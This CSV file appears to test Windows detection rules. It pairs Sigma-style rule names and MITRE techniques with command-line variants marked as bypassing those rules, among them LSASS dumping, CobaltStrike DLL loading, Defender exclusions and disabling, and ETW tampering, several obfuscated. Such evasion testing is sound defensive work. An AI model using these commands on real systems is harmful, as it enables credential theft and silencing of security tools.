Technical,Rule_name,Title,Rule_id,Command_match_rule,Commandline_evasion,Excutable,Bypass target rule,Bypass all rule,Trigger rule
t1036,proc_creation_win_createdump_lolbin_execution,CreateDump Process Dump,515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48,,"""C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\5.0.17\\createdump.exe"" --full --name C:\\Users\\thaim\\AppData\\Local\\Temp\\dotnet-lsass.dmp 788",TRUE,TRUE,TRUE,
t1036,proc_creation_win_dumpminitool_execution,DumpMinitool Execution,dee0a7a3-f200-4112-a99b-952196d81e42,,"DumpMinitool.exe 712 C:\temp\dump.dmp F""ull",TRUE,TRUE,TRUE,
t1036,proc_creation_win_dumpminitool_execution,DumpMinitool Execution,dee0a7a3-f200-4112-a99b-952196d81e42,,DumpMinitool.exe 712 C:\temp\dump.dmp Full,TRUE,TRUE,TRUE,
t1553.004,proc_creation_win_powershell_x509enrollment,Suspicious X509Enrollment - Process Creation,114de787-4eb2-48cc-abdb-c0b449f93ea4,,"powershell.exe -Command ""$clsid = '884e2002-217d-11da-b2a4-000`ne7bbb2b09'; $type = [type]::GetTypeFromCLSID($clsid); $obj = [Activator]::CreateInstance($type)""",TRUE,TRUE,TRUE,
t1553.004,proc_creation_win_powershell_x509enrollment,Suspicious X509Enrollment - Process Creation,114de787-4eb2-48cc-abdb-c0b449f93ea4,,"powershell.exe -Command ""$com = 'X509Enrollment.CBinaryConverter'; $obj = New-Object -ComObject $com""",TRUE,TRUE,TRUE,
t1553.004,proc_creation_win_powershell_x509enrollment,Suspicious X509Enrollment - Process Creation,114de787-4eb2-48cc-abdb-c0b449f93ea4,,"powershell.exe -Command ""$com = 'X509Enrollment' + '.' + 'CBinaryConverter'; $obj = New-Object -ComObject $com""",TRUE,TRUE,TRUE,
t1614.001,proc_creation_win_chcp_codepage_lookup,Console CodePage Lookup Via CHCP,7090adee-82e2-4269-bd59-80691e7c6338,,chcp,TRUE,TRUE,TRUE,
t1614.001,proc_creation_win_chcp_codepage_lookup,Console CodePage Lookup Via CHCP,7090adee-82e2-4269-bd59-80691e7c6338,,"cmd.exe /c ""chcp""",TRUE,TRUE,TRUE,
t1218.011,proc_creation_win_citrix_trolleyexpress_procdump,Process Access via TrolleyExpress Exclusion,4c0aaedc-154c-4427-ada0-d80ef9c9deb6,,TrolleyExpress.exe 999,TRUE,TRUE,TRUE,
t1218.011,proc_creation_win_citrix_trolleyexpress_procdump,Process Access via TrolleyExpress Exclusion,4c0aaedc-154c-4427-ada0-d80ef9c9deb6,,TrolleyExpress.exe `755`,TRUE,TRUE,TRUE,
t1218.011,proc_creation_win_hktl_cobaltstrike_load_by_rundll32,CobaltStrike Load by Rundll32,ae9c6a7c-9521-42a6-915e-5aaa8689d529,,"rundll32.exe payload.dll,StartW",TRUE,TRUE,TRUE,
t1218.011,proc_creation_win_hktl_cobaltstrike_load_by_rundll32,CobaltStrike Load by Rundll32,ae9c6a7c-9521-42a6-915e-5aaa8689d529,,"rundll32.exe ""payload.dll"",StartW",TRUE,TRUE,TRUE,
t1218.011,proc_creation_win_hktl_cobaltstrike_load_by_rundll32,CobaltStrike Load by Rundll32,ae9c6a7c-9521-42a6-915e-5aaa8689d529,,"rundll32.exe C:\temp\payload.dll,StartW",TRUE,TRUE,TRUE,
t1218.011,proc_creation_win_rundll32_installscreensaver,Rundll32 InstallScreenSaver Execution,15bd98ea-55f4-4d37-b09a-e7caa0fa2221,,"rundll32.exe"" desk.cpl,InstallScreenSaver test.scr",TRUE,TRUE,TRUE,
t1218.011,proc_creation_win_rundll32_shell32_susp_execution,Shell32 DLL Execution in Suspicious Directory,32b96012-7892-429e-b26c-ac2bf46066ff,,"rundll32.exe shell32.dll,Control_RunDLL payload.dll",TRUE,TRUE,TRUE,
t1102,proc_creation_win_cloudflared_tunnel_cleanup,Cloudflared Tunnel Connections Cleanup,7050bba1-1aed-454e-8f73-3f46f09ce56a,,"cloudflared tunnel cleanup --config=""C:\temp\config.yml""",TRUE,TRUE,TRUE,
t1102,proc_creation_win_cloudflared_tunnel_cleanup,Cloudflared Tunnel Connections Cleanup,7050bba1-1aed-454e-8f73-3f46f09ce56a,,cloudflared.exe tunnel cleanup -config=C:\temp\config.yml,TRUE,TRUE,TRUE,
t1059,proc_creation_win_cmd_dosfuscation,Potential Dosfuscation Activity,a77c1610-fc73-4019-8e29-0f51efc04a51,,"cmd.exe /c ""s""e""t OBJ=calc.exe && %O%B%J%""",TRUE,TRUE,TRUE,
t1059,proc_creation_win_forfiles_proxy_execution_,Forfiles Command Execution,9aa5106d-bce3-4b13-86df-3a20f1d5cf0b,,"forfiles /p c:\windows\system32 /m notepad.exe /c""calc.exe""",TRUE,TRUE,TRUE,
t1059,proc_creation_win_forfiles_proxy_execution_,Forfiles Command Execution,9aa5106d-bce3-4b13-86df-3a20f1d5cf0b,,forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe,TRUE,TRUE,TRUE,
t1059,proc_creation_win_fsutil_symlinkevaluation,Fsutil Behavior Set SymlinkEvaluation,c0b2768a-dd06-4671-8339-b16ca8d1f27f,,fsutil behavior set SymlinkEvaluation R2L:1,TRUE,TRUE,TRUE,
t1059,proc_creation_win_fsutil_symlinkevaluation,Fsutil Behavior Set SymlinkEvaluation,c0b2768a-dd06-4671-8339-b16ca8d1f27f,,fsutil behavior set SymlinkEvaluation R2R:1,TRUE,TRUE,TRUE,
t1059,proc_creation_win_fsutil_symlinkevaluation,Fsutil Behavior Set SymlinkEvaluation,c0b2768a-dd06-4671-8339-b16ca8d1f27f,,"reg add ""HKLM\System\CurrentControlSet\Control\FileSystem"" /v ""SymlinkRemoteToLocalEvaluation"" /t REG_DWORD /d 1 /f",TRUE,TRUE,TRUE,
t1059,proc_creation_win_ftp_arbitrary_command_execution,Potential Arbitrary Command Execution Via FTP.EXE,06b401f4-107c-4ff9-947f-9ec1e7649f1e,,ftp -s:script.txt,TRUE,TRUE,TRUE,
t1059,proc_creation_win_lolbin_pcalua,Use of Pcalua For Execution,0955e4e1-c281-4fb9-9ee1-5ee7b4b754d2,,pcalua.exe -a calc.exe,TRUE,TRUE,TRUE,
t1059,proc_creation_win_lolbin_runscripthelper,Suspicious Runscripthelper.exe,eca49c87-8a75-4f13-9c73-a5a29e845f03,,runscripthelper.exe surfacecheck script.ps1 C:\Windows\Temp,TRUE,TRUE,TRUE,
t1059,proc_creation_win_lolbin_runscripthelper,Suspicious Runscripthelper.exe,eca49c87-8a75-4f13-9c73-a5a29e845f03,,runscripthelper.exe surfacecheck script.ps1 C:\Windows\Temp\.,TRUE,TRUE,TRUE,
t1059,proc_creation_win_php_inline_command_execution,Php Inline Command Execution,d81871ef-5738-47ab-9797-7a9c90cd4bfb,,"php.exe --run ""system('whoami');""",TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_defender_remove_context_menu,Windows Defender Context Menu Removed,b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b,,"powershell.exe -Command ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'""",TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_defender_remove_context_menu,Windows Defender Context Menu Removed,b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b,,"powershell.exe -c ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'""",TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_defender_remove_context_menu,Windows Defender Context Menu Removed,b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b,,"powershell.exe -Command ""rm HKCR:\*\shellex\ContextMenuHandlers\EPP""",TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_defender_remove_context_menu,Windows Defender Context Menu Removed,b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b,,"powershell.exe -Command ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'"" -WindowStyle Hidden",TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_defender_remove_context_menu,Windows Defender Context Menu Removed,b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b,,"powershell.exe -Command ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'"" -NonInteractive",TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_dism_remove,Dism Remove Online Package,43e32da2-fdd0-4156-90de-50dfd62636f9,,dism.exe /Online -Disable-Feature /FeatureName:Windows-Defender /NoRestart /Quiet,TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_dism_remove,Dism Remove Online Package,43e32da2-fdd0-4156-90de-50dfd62636f9,,dism.exe /Online /Disable-Feature /FeatureName:Windows-Defender /Quiet /NoRestart,TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_logman_disable_eventlog,Suspicious Windows Trace ETW Session Tamper Via Logman.EXE,cd1f961e-0b96-436b-b7c6-38da4583ec00,,"logman.exe stop  ""Circular Kernel Context Logger""",TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_powershell_disable_ie_features,Disabled IE Security Features,fb50eb7a-5ab1-43ae-bcc9-091818cb8424,,New-ItemProperty -Path 'HKCU\Software\Microsoft\Internet Explorer\Main' -PropertyType DWord -Name 'DisableFirstRunCustomize' -Value 2,TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_powershell_disable_ie_features,Disabled IE Security Features,fb50eb7a-5ab1-43ae-bcc9-091818cb8424,,"New-ItemProperty -Path ""HKCU\Software\Microsoft\Internet Explorer\Main"" -Name ""DisableFirstRunCustomize"" -Value 2 -PropertyType DWord",TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_powershell_disable_ie_features,Disabled IE Security Features,fb50eb7a-5ab1-43ae-bcc9-091818cb8424,,"New-ItemProperty -Path ""HKCU\Software\Microsoft\Internet Explorer\Main"" -PropertyType DWord -Name ""DisableFirstRunCustomize`"" -Value 2",TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_powershell_remove_mppreference,Tamper Windows Defender Remove-MpPreference,07e3cb2c-0608-410d-be4b-1511cb1a0448,,"powershell.exe -Command ""[System.Management.Automation.PowerShell]::Create().AddCommand('Remove-MpPreference').AddParameter('ControlledFolderAccessProtectedFolders', 'C:\').Invoke()""",TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_powershell_remove_mppreference,Tamper Windows Defender Remove-MpPreference,07e3cb2c-0608-410d-be4b-1511cb1a0448,,"powershell.exe -Command ""& { $cmd = 'Remove-MpPreference'; & $cmd -ControlledFolderAccessProtectedFolders 'C:\' }""",TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_powershell_set_service_disabled,Service StartupType Change Via PowerShell Set-Service,62b20d44-1546-4e61-afce-8e175eb9473c,,"powershell -Command ""Set-Service -Name 'Spooler' -StartupType 'Disabled'""",TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_powershell_set_service_disabled,Service StartupType Change Via PowerShell Set-Service,62b20d44-1546-4e61-afce-8e175eb9473c,,"powershell -Command ""Set-Service -Name Spooler -StartupType Disabled""",TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_powershell_set_service_disabled,Service StartupType Change Via PowerShell Set-Service,62b20d44-1546-4e61-afce-8e175eb9473c,,"powershell -Command ""Set-Service Spooler -StartupType Disabled""",TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_powershell_set_service_disabled,Service StartupType Change Via PowerShell Set-Service,62b20d44-1546-4e61-afce-8e175eb9473c,,"powershell -Command ""Set-Service -StartupType 'Disabled' -Name Spooler""",TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_reg_defender_exclusion,Suspicious Windows Defender Folder Exclusion Added Via Reg.EXE,48917adc-a28e-4f5d-b729-11e75da8941f,,"reg.exe ADD ""HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"" ^/v ""C:\\Evil"" ^/t REG_DWORD ^/d 0 ^/f",TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_reg_defender_exclusion,Suspicious Windows Defender Folder Exclusion Added Via Reg.EXE,48917adc-a28e-4f5d-b729-11e75da8941f,,"reg.exe ADD ""HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths"" /v ""C:\\Evil"" /t REG_DWORD /d 0 /f",TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_reg_defender_exclusion,Suspicious Windows Defender Folder Exclusion Added Via Reg.EXE,48917adc-a28e-4f5d-b729-11e75da8941f,,"reg.exe ADD ""HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"" /v C:\\Evil /t REG_DWORD /d 0 /f",TRUE,TRUE,TRUE,
t1562.001,proc_creation_win_reg_defender_exclusion,Suspicious Windows Defender Folder Exclusion Added Via Reg.EXE,48917adc-a28e-4f5d-b729-11e75da8941f,,"reg.exe ADD ""HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"" /v ""C:\\Evil"" /t REG_DWORD /d 00 /f",TRUE,TRUE,TRUE,
t1574.001,proc_creation_win_deviceenroller_dll_sideloading,Potential DLL Sideloading Via DeviceEnroller.EXE,e173ad47-4388-4012-ae62-bd13f71c18a8,,deviceenroller.exe /PhoneDeepLink,TRUE,TRUE,TRUE,
t1574.001,proc_creation_win_dnscmd_install_new_server_level_plugin_dll,New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE,f63b56ee-3f79-4b8a-97fb-5c48007e8573,,dnscmd.exe /CONFIG /SERVERLEVELPLUGINDLL $env:TEMP\malicious.dll,TRUE,TRUE,TRUE,
t1082,proc_creation_win_discovery_via_reg_queries,System Information Discovery via Registry Queries,0022869c-49f7-4ff2-ba03-85ac42ddac58,,"reg query ""HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation"" /v TimeZoneKeyName",TRUE,TRUE,TRUE,
t1082,proc_creation_win_discovery_via_reg_queries,System Information Discovery via Registry Queries,0022869c-49f7-4ff2-ba03-85ac42ddac58,,"""powershell.exe"" & {Get-ItemPropertyValue -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Shell""}",TRUE,TRUE,TRUE,
